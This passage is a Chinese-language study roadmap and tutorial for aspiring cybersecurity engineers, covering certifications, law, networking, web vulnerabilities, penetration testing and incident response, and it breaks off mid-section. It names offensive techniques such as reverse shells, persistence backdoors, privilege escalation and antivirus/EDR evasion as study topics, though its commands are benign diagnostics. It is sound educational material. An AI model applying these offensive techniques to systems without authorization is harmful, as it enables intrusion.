# 网络安全工程师从零开始完整学习路线

> **面向对象**：从零基础开始的人；也适合有 IT 背景的转型者（运维/开发转安全，优势极大）。
> **参考体系**：国内外主流培训机构课程与认证——国际（CompTIA / EC-Council CEH / OffSec OSCP / SANS / ISC² CISSP）、国内（NISP / CISP / CISP-PTE / CISAW / 等保测评师 / 奇安信、深信服、华为厂商认证）。
> **学习方法**：每阶段先读"一句话本质"建立直觉 → 按"掌握清单"逐项学 → 做"实战任务"动手练 → 用"达标标准"自检。
> **铁律**：只学不练等于没学。安全是攻防对抗，必须搭靶场动手；未授权渗透违法，练习只能在授权靶场/测试环境。

---

## 〇、入行认知（先搞清楚再动手）

1. 网络安全是什么
   - 一句话本质：保证信息的**机密性（C）**、**完整性（I）**、**可用性（A）**——CIA 三元组，所有安全动作都围绕它
   - 类比：网络安全工程师 = 大楼的"安防设计师 + 保安队长 + 消防队"，不是影视剧里的"黑客"那么简单
2. 岗位分类（选赛道，决定学什么侧重）
   - **红队（攻击方）**：渗透测试、漏洞挖掘、红队演练 → 类比"模拟小偷去测试安防"
   - **蓝队（防守方）**：安全运维、SOC 分析师、应急响应 → 类比"保安 + 监控室 + 救火队"
   - **其他方向**：安全开发、安全架构、等保合规、安全顾问、安全产品
3. 法律红线（必须第一条学，不然学完就进去）
   - 三部大法：《网络安全法》《数据安全法》《个人信息保护法》
   - 铁律：未授权渗透 = 违法；练手只能打靶场、CTF、有授权的 SRC
4. 培训体系认知（考试认证 = 敲门砖）
   - 国际入门：CompTIA Security+（安全行业最普及的入门认证）
   - 国际渗透：OffSec OSCP（业内容量最硬核的渗透认证）、CEH（理论向）
   - 国际防守：CompTIA CySA+、SANS SEC504（GCIH）
   - 国际管理：ISC² CISSP（安全圈"顶级身份证"）
   - 国内入门：NISP（国家信息安全水平考试，一级→二级→三级）
   - 国内主流：CISP（注册信息安全专业人员）、CISP-PTE（渗透测试工程师，实操）
   - 国内厂商：奇安信、深信服、华为 HCIE-Security 认证体系

---

## 第一阶段：地基（网络 + Linux + 编程）｜约 1-2 个月

1. 一句话本质：不懂网络、系统、代码，安全就是空中楼阁——攻击就是利用这三者的漏洞。
2. 计算机网络（对应 CompTIA Network+ 前置）
   - TCP/IP 四层模型与 OSI 七层，三次握手/四次挥手
   - HTTP/HTTPS：请求方法、状态码、请求头、Cookie/Session、TLS 握手
   - DNS 解析流程、常见端口（22/80/443/3306/6379/3389/8080）
   - 抓包工具：Wireshark（分析三次握手、HTTP 明文、可疑流量）
3. Linux 系统（你有 8 年运维经验，这里可快速过，重点补"安全视角"）
   - 命令、权限、文件系统、进程、服务、日志你都会了
   - 安全视角补课：SUID/SGID 提权面、/etc/shadow 密码文件、日志审计（/var/log/auth.log 登录记录）
4. 编程基础（主 Python，副基础 Web 三件套）
   - Python：socket 网络编程、requests 库、脚本自动化
   - Web 基础：看懂 HTML/JS 页面、知道表单怎么提交、SQL 基本增删改查
5. 实战任务
   - 用 Wireshark 抓一次完整的 HTTP 访问过程，能说出每步在哪一层
   - 用 Python socket 写一个端口扫描器（扫本机 1-1000）
   - 手写一个 HTTP 请求（用 nc 或 Python），观察服务器响应
6. 达标标准
   - 能独立抓包分析 TCP 三次握手
   - 能说出 HTTP 请求/响应的完整结构
   - 会用 Python 写小工具（扫描、请求、解析）

---

## 第二阶段：安全基础核心（密码学 + Web 安全 + 系统安全）｜约 2 个月

1. 一句话本质：先懂"漏洞为什么存在"，再学"怎么打怎么防"——第二阶段就是安全世界观。
2. 密码学基础
   - 对称加密（AES）、非对称加密（RSA）、哈希（MD5/SHA，注意哈希≠加密）
   - TLS/HTTPS 原理：证书、握手、为什么用非对称协商+对称传输
   - 常见错误：弱口令、明文存储、MD5 撞库
3. 认证与授权
   - Session 与 Cookie、Token（JWT）机制
   - 登录流程的常见漏洞：暴力破解、会话固定、越权
4. Web 安全核心（OWASP Top 10，背到滚瓜烂熟）
   - SQL 注入（原理、联合查询注入、绕过、防御参数化查询）
   - XSS（反射型/存储型/DOM 型，防御转义+CSP）
   - CSRF（跨站请求伪造，防御 token 校验）
   - SSRF（服务端请求伪造）
   - 文件上传（绕过与防御）
   - 命令注入、反序列化、越权（水平/垂直）
5. 系统安全
   - Linux/Windows 用户权限模型、提权原理（SUID、内核漏洞、服务漏洞）
   - 安全基线：禁用 root 远程登录、SSH 密钥认证、最小权限、补丁管理
   - 对应认证：CompTIA Security+（考过它 = 安全基础过关的行业证明）
6. 实战任务
   - 在 DVWA（靶场）亲手复现 SQL 注入、XSS、CSRF、文件上传
   - 用 Burp Suite 拦截/重放一个请求，理解代理抓包原理
   - 给自己的 Linux 做一份安全加固清单并逐项执行
7. 达标标准
   - 能不看资料讲清 OWASP Top 10 每个漏洞的"原理 + 利用 + 防御"
   - 能在靶场独立完成一个漏洞的完整复现
   - 能独立完成一台 Linux 的基础安全加固

---

## 第三阶段：红队攻防（渗透测试，主攻方向之一）｜约 3-4 个月

1. 一句话本质：渗透测试 = 站在攻击者视角，按"侦察 → 突破 → 提权 → 横向 → 收尾"的标准流程，在授权范围内打进去。
2. 信息收集（打点前最重要，占成功一半）
   - 子域名枚举（subfinder）、端口扫描（nmap）、指纹识别（whatweb）
   - 测绘平台：FOFA / Quake / 鹰图（搜暴露资产）
3. Web 渗透
   - SQL 注入工具化：sqlmap（但要先懂手工注入）
   - XSS 平台、文件上传绕过（后缀/内容/MIME）、SSRF 利用
   - 目录扫描（dirsearch）、越权测试
   - 靶场：sqli-labs、pikachu、DVWA
4. 漏洞利用与后渗透
   - Metasploit（msfconsole + msfvenom）：生成 payload、利用模块、反弹 shell
   - Linux 提权：SUID 提权、内核漏洞、sudo 配置错误、计划任务
   - Windows 提权：Potato 系列、服务路径、令牌窃取
   - 权限维持：后门、计划任务、SSH 公钥
5. 内网渗透（进阶，但必学）
   - 内网信息收集、代理穿透（frp）、横向移动（PTH、MS17-010）
   - 域渗透基础：Kerberoast、黄金票据/白银票据概念
6. 免杀与对抗（了解为主）
   - shellcode 免杀原理、编码混淆、绕过杀软/EDR 的常见思路
7. 对应课程与认证
   - 国际：OffSec OSCP（PEN-200，渗透圈含金量标杆）、CEH（理论入门）
   - 国内：CISP-PTE（实操考试，国内渗透岗认可度高）
   - 平台：TryHackMe（新手友好）、Hack The Box（进阶）、i春秋、合天网安学院
8. 达标标准
   - 能在授权靶场独立完成一次完整渗透流程并写出渗透测试报告（信息收集→漏洞发现→利用→提权→报告）
   - 熟练掌握 nmap、Burp Suite、sqlmap、Metasploit 四件套

---

## 第四阶段：蓝队防护（安全运维，你的主场）｜约 2-3 个月

1. 一句话本质：蓝队 = 把运维经验升级到"安全视角"——你 8 年 Linux 运维底子在这里是巨大优势，最容易上手且岗位多。
2. 安全设备与产品
   - 防火墙规则、WAF（Web 应用防火墙，拦截 Web 攻击）
   - IDS/IPS：Snort、Suricata（入侵检测/防御）
   - HIDS：Wazuh、Agent 主机监控
   - SIEM：Elastic Stack / Splunk（日志集中分析）
3. 日志分析与异常检测
   - Linux 安全日志：/var/log/auth.log、secure、last 命令看登录记录
   - Web 日志分析：访问日志找扫描特征、webshell 痕迹
   - 异常行为：异常登录、异常进程、异常外连、账号新增
4. 应急响应（面试必考）
   - 勒索病毒处置流程：隔离 → 断网 → 取证 → 清除 → 恢复
   - 挖矿木马清除：找进程 → 杀进程 → 删文件 → 修自启动 → 加固
   - webshell 排查：找恶意文件 → 分析后门 → 溯源注入方式
   - DDoS 应急：牵引、清洗、限速
5. 威胁情报与溯源
   - 威胁情报平台、IP 信誉库、样本分析（沙箱）
   - 溯源反制基础：从日志还原攻击时间线
6. 合规与等保
   - 等级保护 2.0 基本要求（定级、备案、测评、整改）
   - 对应认证：CompTIA CySA+、SANS SEC504（GCIH 事件响应）、国内 CISP/CISAW 安全运维方向
7. 达标标准
   - 能根据一份日志还原一次入侵全过程（攻击时间线）
   - 能独立处置挖矿、勒索、webshell 三类最常见安全事件
   - 能说出等保 2.0 的五个动作流程

---

## 第五阶段：专项进阶（选 1-2 个方向深挖）｜持续 3 个月以上

1. 一句话本质：泛而不精 = 没有竞争力；进阶必须选方向，往一个领域扎深。
2. 方向一：代码审计（适合有编程底子的人）
   - PHP/Java 代码审计思路、白盒挖洞
   - 工具：Fortify、SonarQube、Seay 源码审计
   - 对应：OffSec OSWE（Web 应用专家）
3. 方向二：二进制与逆向（适合喜欢底层的人）
   - 逆向工程：IDA Pro、Ghidra、x64dbg
   - 栈溢出、堆溢出、格式化字符串、Pwn（CTF Pwn 方向）
   - 对应：SANS FOR508（数字取证）侧、CTF Pwn 题
4. 方向三：云安全（你的云原生基础直接对口）
   - 云平台安全：阿里云/腾讯云安全产品（云防火墙、云 WAF、态势感知）
   - 容器安全：Docker/K8s 安全、镜像扫描、容器逃逸原理
   - 云渗透：云资产攻击面、对象存储越权
   - 对应：ISC² CCSP（云安全专家）、CISP 云安全方向
5. 方向四：移动安全
   - Android APP 逆向（jadx、frida）、APP 抓包、动态调试
6. 方向五：工控安全（蓝海方向）
   - ICS/SCADA 协议、工业控制系统安全
7. 达标标准
   - 至少在一个方向能独立完成"发现漏洞 → 利用 → 输出报告"

---

## 第六阶段：实战与认证（刷经验 + 拿证）｜贯穿全程

1. 一句话本质：安全行业最认"实战证据"——护网、CTF、SRC 漏洞，比任何证书都硬。
2. 靶场与在线平台（每天 1-2 题保持手感）
   - 国际：TryHackMe、Hack The Box
   - 国内：攻防世界、BUUCTF、i春秋、合天网安学院
3. CTF 比赛（简历亮点）
   - 强网杯、护网杯、XCTF、校内赛
   - 入门先打 Web + Misc 方向，再进阶 Pwn/Reverse/Crypto
4. 护网行动（HVV）——安全圈最重要的实战经历
   - 每年 7-8 月国家护网：蓝队防守（告警研判、应急）、红队攻击
   - 哪怕当"见习"也要争取参与，这是简历里最硬的项目经历
5. SRC 众测（合法挖洞）
   - 补天、漏洞盒子、各大厂商 SRC（腾讯/阿里/字节/百度）
   - 挖到高危漏洞 = 简历亮点 + 奖金 + 行业曝光
6. 认证路线建议（按阶段考，别一上来就考 CISSP）
   - 入门：NISP 二级 / CompTIA Security+ / eJPT
   - 中级：CEH / CISP / CISP-PTE / OSCP（含金量最高、面试最认）
   - 高级：CISSP / OSWE / OSEP / CISP-DSG
7. 达标标准
   - 累计在靶场独立完成 30+ 台机器
   - 参加至少一次 CTF 或护网
   - 拿到至少 1 个入门/中级认证

---

## 第七阶段：求职与面试（把能力换成 Offer）

1. 简历怎么写（安全岗看证据）
   - 项目经历优先：护网经历、SRC 漏洞、渗透测试报告、应急响应案例
   - 技能列表：工具（nmap/Burp/sqlmap/Metasploit）+ 方向（Web 渗透/内网/应急）
   - 你的加分项：8 年 Linux 运维 + Python + 前后端 → 安全运维/安全工程师（甲方）方向竞争力强
2. 岗位方向怎么选
   - 转型最稳：安全运维工程师、安全工程师（甲方）——你运维经验直接平移
   - 高薪方向：渗透测试工程师、红队——需把攻防深度补到位
   - 特色方向：云安全工程师（云原生基础对口）、安全研发
3. 面试高频题（提前背熟）
   - SQL 注入原理与防御？XSS 有哪些类型？
   - 渗透测试标准流程？提权思路？
   - 应急响应流程？遇到勒索/挖矿怎么处置？
   - OWASP Top 10 有哪些？常见端口与服务？
   - 你的优势打法：用"运维 + 安全"组合举例（如：我做过服务器加固、日志审计、应急响应，这些和运维天然一体）
4. 达标标准
   - 能流畅答出上述高频题，有 2-3 个完整实战案例可讲
   - 简历有护网/SRC/靶场渗透报告至少一项硬证据

---

## 附录一、常用工具速查（按用途）

1. 信息收集：nmap（端口）、subfinder（子域）、whatweb（指纹）、FOFA/Quake（资产测绘）
2. Web 渗透：Burp Suite（抓包改包，必会）、sqlmap（注入）、xray（被动扫描）、dirsearch（目录）
3. 漏洞利用：Metasploit、msfvenom、BeEF
4. 内网渗透：fscan（内网快速扫描）、frp（代理穿透）、Cobalt Strike（红队平台）、mimikatz（抓取凭据）
5. 逆向与二进制：IDA Pro、Ghidra、x64dbg、gdb
6. 抓包分析：Wireshark、tcpdump（你已经很熟）
7. 蓝队工具：Snort/Suricata（IDS）、Wazuh（HIDS）、Elastic Stack（日志）、VirusTotal（样本查毒）

## 附录二、学习资源推荐

1. 书单
   - 入门：《Web 安全深度剖析》《白帽子讲 Web 安全》
   - 进阶：《Web 安全攻防：渗透测试实战指南》《内网安全攻防》
   - 体系：CompTIA Security+ 官方教材（中文版）
2. 在线平台
   - 靶场：DVWA、sqli-labs、pikachu（本地练手）、TryHackMe、Hack The Box
   - 题库：攻防世界、BUUCTF
3. 社区与资讯
   - FreeBuf、安全客、先知社区、奇安信攻防社区
   - 漏洞平台：补天、漏洞盒子
4. 课程渠道
   - 国内：i春秋、合天网安学院（体系化付费课）、B 站安全 up 主（入门免费课）
   - 国际：TryHackMe 免费课程、OffSec 官方课程、SANS 公开资料

## 附录三、总路线图（一张图记心中）

```
零基础
  ↓
① 地基：网络 + Linux + 编程（1-2 个月）→ 懂协议、懂系统、能写脚本
  ↓
② 安全基础：密码学 + OWASP Top 10 + 系统安全（2 个月）→ 懂漏洞为什么存在
  ↓
③ 红队攻防：Web 渗透 + 内网 + 提权（3-4 个月）→ 会打
  ↓
④ 蓝队防护：日志 + 应急 + 设备 + 等保（2-3 个月）→ 会防（运维背景主场）
  ↓
⑤ 专项进阶：审计 / 二进制 / 云安全 / 移动（选 1-2 个）→ 有深度
  ↓
⑥ 实战认证：靶场 + CTF + 护网 + SRC + 认证 → 有证据
  ↓
⑦ 求职面试：简历（护网/SRC/报告）+ 高频题 → 拿 Offer
```

> 补充建议：① 每天保证 1-2 小时刷靶场，安全是手艺活；② 学红队的同时一定要学蓝队——只会打不会防，面试和实战都吃亏；③ 你的运维背景是差异化优势，求职主打"安全运维/安全工程师（甲方）"，渗透方向作为加分项补深。

---

# 详细教学版（按路线图逐知识点展开）

> 使用说明：每个知识点固定 6 个环节——① 一句话本质（先建立直觉）→ ② 生活类比（通俗化理解）→ ③ 原理详解（掌握干货）→ ④ 命令/代码示例（动手跑一遍）→ ⑤ 实战任务（练手，只在授权靶场/测试环境）→ ⑥ 面试考点（考前一问一答）。
> 学法建议：先看 ①② 建立直觉，再精读 ③，亲手敲 ④，完成 ⑤，最后用 ⑥ 自测。安全是手艺活，动手比例要占到 70% 以上。

## 第〇阶段：入行认知（4 个知识点）

### 知识点 1：网络安全是什么（CIA 三元组）

**① 一句话本质**
安全的一切动作，都是为了守住信息的三个属性：机密性（C）、完整性（I）、可用性（A）。

**② 生活类比**
把信息当成你家财物：
- 机密性 = 门锁，别人进不来、看不到
- 完整性 = 保险柜+监控，东西不被调包、不被改
- 可用性 = 备用钥匙+备用电源，你要用时随时拿得到

**③ 原理详解**
- 机密性（Confidentiality）：只有授权的人能看
  - 被攻击：数据泄露、网络窃听、越权查看
  - 防御：加密、访问控制、权限最小化
- 完整性（Integrity）：数据不被篡改
  - 被攻击：篡改网页、SQL 注入改数据、中间人改包
  - 防御：哈希校验、数字签名、日志审计
- 可用性（Availability）：服务随时可用
  - 被攻击：DDoS 打挂、勒索加密、删库
  - 防御：冗余、备份、限流、容灾
- 三者互相制约：加密太狠（C）影响易用（A）；备份（A）占资源；任何时候都在三者间取舍

**④ 命令/代码示例**
校验文件完整性（哈希）：
```bash
# 生成校验值并保存
sha256sum /etc/passwd > passwd.sha256
cat passwd.sha256

# 文件被改后再校验，比对失败说明完整性被破坏
sha256sum -c passwd.sha256
```

**⑤ 实战任务**
- 给一个重要文件（如 /etc/shadow）算 sha256 保存，用 vi 改一行后再校验，观察差异
- 用 chmod 给某目录配一个"只有自己可读"的权限，体会机密性控制

**⑥ 面试考点**
- 问：CIA 三个属性各举一个攻击和防御例子？
- 答：C 数据泄露→加密；I 数据篡改→哈希签名；A 服务不可用→冗余备份
- 问：三个属性冲突时怎么取舍？
- 答：看业务。金融重机密性（不泄露第一位），电商/社交重可用性（宕机损失最大），医疗重完整性（数据错人命关天）

### 知识点 2：安全岗位分类（选赛道）

**① 一句话本质**
安全岗位分"攻、防、管、研"四大类，先选方向再学技能，避免什么都学什么都不精。

**② 生活类比**
一个城市的安防体系：
- 红队 = "模拟小偷"，被请来测试哪里能撬开
- 蓝队 = "警察 + 监控室"，日常盯防、出事救火
- 合规 = "司法局"，定规则、查合规
- 安全研发 = "锁厂"，生产安防工具

**③ 原理详解**
- 红队（攻击方）
  - 工作：渗透测试、漏洞挖掘、红队演练、SRC 众测
  - 技能：Web 渗透、内网渗透、免杀、二进制
  - 特点：门槛高、刺激、薪资天花板高、乙方（安全公司）居多
- 蓝队（防守方）
  - 工作：安全运维、SOC 分析师、应急响应、安全设备运维
  - 技能：日志分析、应急处理、安全产品、等保
  - 特点：门槛低、岗位多、稳定，运维转行最对口
- 合规与管理
  - 工作：等保测评、安全制度、风险评估
  - 技能：合规标准、文档、审计
- 安全研发
  - 工作：写 WAF/扫描器/安全平台
  - 技能：编程 + 安全知识，偏开发
- 甲方 vs 乙方：甲方（用你产品的公司）稳定、业务视角；乙方（安全厂商）技术成长快、项目多

**④ 命令/代码示例**
给自己做个技能自评（会哪个打勾）：
```bash
# 一键检查已安装的安全相关工具
for t in nmap sqlmap msfconsole burpsuite wpscan dirsearch hydra wireshark tcpdump; do
  command -v $t >/dev/null 2>&1 && echo "[√] $t" || echo "[ ] $t"
done
```

**⑤ 实战任务**
- 打开招聘网站搜"渗透测试工程师"和"安全运维工程师"各 3 个 JD
- 把 JD 里的技能要求抄下来，对比自己会的，写一份"技能差距清单"

**⑥ 面试考点**
- 问：你想走红队还是蓝队？
- 答（结合你的运维背景）：我 8 年 Linux 运维，天然适合蓝队安全运维，能快速上手；红队作为能力延伸持续补深，目标是攻防兼备

### 知识点 3：法律红线（先学法，再学技术）

**① 一句话本质**
未授权扫描/入侵是犯罪，和你会不会技术无关——动手前先搞懂"授权"两个字。

**② 生活类比**
会开锁不犯法，但拿万能钥匙开别人家门就是入室盗窃。渗透测试 = 房主请来的开锁师傅（有授权），私闯民宅 = 犯罪（无授权）。

**③ 原理详解**
- 《网络安全法》（2017 年施行）：禁止非法入侵、破坏、窃取网络数据
- 《数据安全法》（2021 年施行）：数据分类分级保护，违规处罚很重
- 《个人信息保护法》（2021 年施行）：个人信息处理必须合法、正当、必要
- 《刑法》285/286 条：非法侵入计算机信息系统罪、破坏计算机信息系统罪
- 合法测试的三个条件（缺一不可）
  - 有授权：书面合同、授权书、SRC 平台声明
  - 在授权范围：只能测列出的资产和功能
  - 不越权：不扩大影响、不拖库、不破坏数据
- 常见坑：SRC 里"未列出的资产"不能测；测完要写报告而不是"炫技"

**④ 命令/代码示例**
测试前的授权确认清单（动手前逐条打勾）：
```bash
# 1. 目标资产是对方明确授权给我的吗？（合同/SRC 范围声明）
# 2. 测试手段在允许范围内吗？（禁止拖库/DoS/破坏）
# 3. 测试环境准备好了吗？（优先用 DVWA 等本地靶场）
# 只有三条全 √ 才能开始，否则一律不测
```

**⑤ 实战任务**
- 打开一个 SRC 平台（补天/漏洞盒子），阅读它的测试范围声明
- 写一段话：哪些资产允许测、哪些手段被禁止、发现漏洞后正确的提交姿势

**⑥ 面试考点**
- 问：你做过渗透测试吗？有没有实战案例？
- 答：做过，全部在授权环境（本地靶场 DVWA、sqli-labs、SRC 声明的测试资产），未授权环境一律不碰，这是底线
- 问：SRC 挖洞违法吗？
- 答：在厂商声明授权范围内合法，超范围（如未列资产、脱裤、DoS）即违法

### 知识点 4：培训认证体系（考证 = 敲门砖）

**① 一句话本质**
认证是行业对你的"体检报告"——国内认 CISP/NISP，国际认 Security+/OSCP，不同岗位认不同证。

**② 生活类比**
就像驾驶证：C 照（Security+/NISP）入门人人可考，B 照（OSCP）才能开"大车"（渗透），A 照（CISSP）是资历+管理证明。

**③ 原理详解**
- 入门级（新手/学生）：NISP 二级、CompTIA Security+、eJPT
- 渗透方向：OffSec OSCP（国际含金量标杆）、CISP-PTE（国内实操认可）、CEH（理论向）
- 防守方向：CompTIA CySA+、SANS GCIH（事件响应）
- 管理方向：ISC² CISSP（安全圈"顶级身份证"）、CISP（国内政企招投标常见要求）
- 注意事项
  - 证书是敲门砖，不是能力本身；证书 + 项目经历才有说服力
  - 考认证前先看目标岗位 JD 要求，别盲目考证
  - 证书有效期普遍 3 年，需要继续教育/重考维持

**④ 命令/代码示例**
按目标岗位选认证的决策清单：
```bash
# 目标：安全运维/甲方安全工程师
#   推荐：NISP 二级 → CISP / Security+ → CISSP（长期）
# 目标：渗透测试工程师
#   推荐：eJPT → CISP-PTE → OSCP（进阶）
# 目标：安全研发/云安全
#   推荐：Security+ → CCSP / CISP 云安全方向
```

**⑤ 实战任务**
- 搜 3 个心仪岗位的 JD，记录它们"优先/要求"的证书
- 对照自己的目标岗位，写出"考证时间表"（未来 12 个月考哪些）

**⑥ 面试考点**
- 问：你考了哪些认证？
- 答：如实说。没考就答"我已具备 XXX 能力（用项目证明），计划考取 XXX（与目标岗位匹配），证书我会视岗位需要尽快补齐"
- 问：为什么没考 CISSP？
- 答：CISSP 需要 5 年经验且偏管理，我先在技术岗位积累实战，考 CISSP 是 3-5 年规划（体现你有规划而非没能力）

## 第一阶段：地基（网络 + Linux + 编程）约 6 个知识点

### 知识点 1：TCP/IP 四层模型与三次握手/四次挥手

**① 一句话本质**
所有网络通信都跑在这四层上——应用层（管内容）→ 传输层（管连接）→ 网络层（管地址路由）→ 链路层（管物理传输），三次握手负责"建立连接"，四次挥手负责"断开连接"。

**② 生活类比**
寄快递：
- 应用层 = 包裹里的商品（HTTP 数据）
- 传输层 = 快递单上的收件确认（TCP 编号、是否签收）
- 网络层 = 快递分拨中心的地址路由（IP）
- 链路层 = 快递员实际送货的车（网卡/网线）
三次握手 = 打电话前先"喂？""在吗？""我在！"确认双方在线；四次挥手 = 挂电话前互相说再见。

**③ 原理详解**
- 四层各自职责（背熟）
  - 应用层：HTTP/FTP/DNS/SMTP，产生数据
  - 传输层：TCP/UDP，端口 + 可靠传输
  - 网络层：IP/ICMP，寻址与路由
  - 链路层：以太网，物理地址 MAC
- TCP 三次握手（为什么是 3 次：保证双方收发能力都正常）
  - 第 1 次：客户端发 SYN（我要连你）
  - 第 2 次：服务端回 SYN+ACK（收到，我也要连你）
  - 第 3 次：客户端回 ACK（确认，开始传数据）
- TCP 四次挥手（为什么是 4 次：双方各自独立关闭）
  - FIN → ACK（主动方说再见，被动方确认）
  - FIN → ACK（被动方也说再见，主动方确认）
- 安全视角（这些是后面渗透的基础）
  - SYN Flood 攻击 = 只发第 1 次握手不回应，打满服务端半连接队列
  - 端口扫描 = 探测某端口是否有 SYN+ACK 回应（开没开服务）

**④ 命令/代码示例**
用 curl 观察一次完整通信，用 ss 看连接状态：
```bash
# 观察 TCP 连接状态（ESTABLISHED = 已握手成功）
ss -ant | grep 443

# 看三次握手过程（用 tcpdump 抓包更直观，见知识点 4）
curl -I https://www.baidu.com
```

**⑤ 实战任务**
- 用 `ss -antp` 观察你机器上所有 TCP 连接的状态，找出 ESTABLISHED 和 TIME_WAIT
- 关掉一个本地服务（如 nginx），再用 `ss -lnt` 看监听端口变化，理解 LISTEN 状态

**⑥ 面试考点**
- 问：为什么 TCP 握手要 3 次而不是 2 次？
- 答：2 次无法确认"客户端能收、服务端能发"双向能力；3 次能防历史重复连接请求的误建立
- 问：四次挥手为什么比握手多一次？
- 答：挥手时双方要各自关闭各自方向的连接，数据可能还在传，不能合并；被动方先确认，等数据发完再 FIN

### 知识点 2：HTTP/HTTPS 协议

**① 一句话本质**
HTTP 是浏览器和服务器之间的"对话格式"——客户端发请求（要什么），服务器回响应（给什么），HTTPS 就是在外面套了一层加密（TLS）防止偷看和篡改。

**② 生活类比**
HTTP 像明信片：邮递员和路上的人都能看到内容；HTTPS 像带锁的保险信封：只有收件人有钥匙能打开。

**③ 原理详解**
- HTTP 请求结构（背熟，抓包/写扫描器全靠它）
  - 请求行：方法 + 路径 + 协议版本（如 `GET /index.php?id=1 HTTP/1.1`）
  - 请求头：Host、User-Agent、Cookie、Content-Type
  - 请求体：POST 提交的数据（用户名密码等）
- HTTP 响应结构
  - 状态行：协议版本 + 状态码 + 原因短语
  - 响应头：Server、Set-Cookie、Content-Type
  - 响应体：HTML/JSON 等实际内容
- 常见状态码（必背）
  - 200 成功 / 301 永久跳转 / 302 临时跳转 / 403 禁止访问 / 404 不存在 / 500 服务器错误 / 502 网关错误 / 503 服务不可用
- 常见方法
  - GET（查，参数在 URL）/ POST（提交，参数在 body）/ PUT（改）/ DELETE（删）
- Cookie 与 Session：服务器给浏览器发"会员卡"（Cookie），下次带卡来就认识你
- HTTPS 原理（一句话版）：先用证书验明正身（非对称加密），再协商一把"会话钥匙"（对称加密），之后用会话钥匙加密传输——非对称慢但安全、对称快但需先安全分发钥匙，两者结合

**④ 命令/代码示例**
用 curl 看请求响应全过程：
```bash
# 看响应头和状态码（-I 只取头）
curl -I http://example.com

# 完整看一次 GET 请求（-v 显示过程，-L 跟随跳转）
curl -v -L http://example.com

# 看 HTTPS 证书信息
echo | openssl s_client -connect www.baidu.com:443 2>/dev/null | openssl x509 -noout -subject -dates
```

**⑤ 实战任务**
- 用 curl -v 访问一个网站，把请求头和响应头分别抄出来，说出每行含义
- 用 curl 带 Cookie 访问一个需要登录的页面（先 -c 存 cookie 再 -b 带 cookie），理解会话机制

**⑥ 面试考点**
- 问：GET 和 POST 的区别？
- 答：GET 参数在 URL（可见、有长度限制、会被缓存/记录日志，不适合传密码）；POST 在 body（相对隐蔽）。从安全角度：敏感数据必须 POST + HTTPS
- 问：HTTPS 一定能保证安全吗？
- 答：HTTPS 加密了传输，但防不了 Web 应用漏洞（SQL 注入、XSS 照样打）；证书被信任链劫持（中间人）也要防

### 知识点 3：DNS 解析与常见端口

**① 一句话本质**
DNS 是"互联网的电话簿"——把人类好记的域名（www.baidu.com）翻译成机器认的 IP（110.242.68.66），端口则是"服务器上不同的门牌号"，每个服务占一扇门。

**② 生活类比**
域名 = 人名（好记），IP = 身份证号（唯一），DNS = 查号台；端口 = 大楼里的房间号，住着不同的服务（80 是前台、22 是保安室、3306 是金库）。

**③ 原理详解**
- DNS 解析完整流程（背熟）
  - 浏览器查本地缓存 → 查系统 hosts 文件 → 查本地 DNS 服务器
  - 本地 DNS 递归查询：根域名服务器 → 顶级域（.com）→ 权威 DNS → 返回 IP
- 常见端口速记（渗透必背）
  - 22 SSH 远程登录 / 21 FTP / 23 Telnet
  - 80 HTTP / 443 HTTPS
  - 3306 MySQL / 6379 Redis / 5432 PostgreSQL
  - 3389 Windows 远程桌面（RDP）/ 27017 MongoDB
  - 8080 常见 Web 代理/备用 HTTP / 9200 Elasticsearch
- 安全视角
  - 端口扫描 = 挨个敲门看哪扇门开着，开着的门就是攻击面
  - DNS 安全：DNS 劫持、域名解析记录泄露子域名（枚举子域名靠它）
  - hosts 文件是"本地电话簿"，被改就中招（常见挂马手段）

**④ 命令/代码示例**
```bash
# 查域名解析（dig 更详细，nslookup 通用）
dig www.baidu.com
nslookup www.baidu.com

# 查看本机 DNS 配置和 hosts
cat /etc/resolv.conf
cat /etc/hosts

# 端口探测（nmap 是主力工具，先看 TCP 全连接扫描）
nmap -sT 127.0.0.1
```

**⑤ 实战任务**
- 用 dig 看 www.baidu.com 的解析全过程，找出 A 记录和 CNAME
- 用 nmap 扫本机 127.0.0.1 的常见端口，对照上面端口表说出每个开放端口可能是什么服务
- 在自己 Linux 的 hosts 里加一条 `127.0.0.1 test.com`，用 curl 访问 test.com 验证 hosts 生效

**⑥ 面试考点**
- 问：域名解析失败/很慢怎么排查？
- 答：先 ping 域名看是否解析 → dig/nslookup 查 DNS → 检查 resolv.conf 和 hosts → 换公共 DNS（114.114.114.114 / 8.8.8.8）对比
- 问：为什么扫描 22 端口开就能猜是 SSH？
- 答：端口号是服务约定俗成的"门牌"，虽然可改，但绝大多数服务用默认端口

### 知识点 4：Wireshark 抓包分析

**① 一句话本质**
Wireshark 是网络的"行车记录仪"——把网卡上经过的每一个数据包都录下来，让你"看见"网络里到底发生了什么。

**② 生活类比**
你在前台装了个摄像头：谁来过（源 IP）、找谁（目的 IP/端口）、说了什么（数据内容）、什么时候走的（时间）全记录下来。网络排障和抓攻击特征都靠它。

**③ 原理详解**
- 抓包原理：网卡默认只收发给自己的包；Wireshark 依赖 libpcap 把网卡设成"混杂模式"，路过的一切都收
- 界面三块（背熟）
  - 顶部：抓包列表（每个包一行，颜色有含义）
  - 中间：协议树（选中的包拆成 链路层/网络层/传输层/应用层）
  - 底部：原始字节（十六进制 + ASCII）
- 常用过滤语法（必会）
  - 按 IP：`ip.addr == 1.2.3.4`
  - 按端口：`tcp.port == 80`
  - 按协议：`http` / `dns` / `tcp.flags.syn == 1`
  - 组合：`ip.addr == 1.2.3.4 && http`
  - 追踪流：右键 → Follow TCP Stream，直接看完整请求响应（明文 HTTP 一览无余）
- 安全视角
  - 明文协议（HTTP/FTP/Telnet）抓包直接看密码
  - 排查恶意流量：异常外连、大流量、可疑 DNS
  - 分析 TCP 重传（网络不稳）、RST（连接被重置，可能被防火墙拦）

**④ 命令/代码示例**
命令行版（tcpdump）与图形版配合：
```bash
# 抓 80 端口流量存文件，再用 Wireshark 打开分析
sudo tcpdump -i eth0 port 80 -w http.pcap

# 抓本机环回流量（练手常用）
sudo tcpdump -i lo port 8080 -w loopback.pcap

# 实时看 10 个 HTTP 包
sudo tcpdump -i eth0 tcp port 80 -c 10
```

**⑤ 实战任务**
- 在自己机器开一个 HTTP 服务（python3 -m http.server 8080），用浏览器访问它
- 同时用 Wireshark 抓 lo 网卡 8080 端口，找到三次握手那 3 个包（SYN、SYN+ACK、ACK）和 HTTP 请求/响应
- 用"Follow TCP Stream"看完整请求内容，找到浏览器 UA 和请求头

**⑥ 面试考点**
- 问：怎么判断是网络问题还是应用问题？
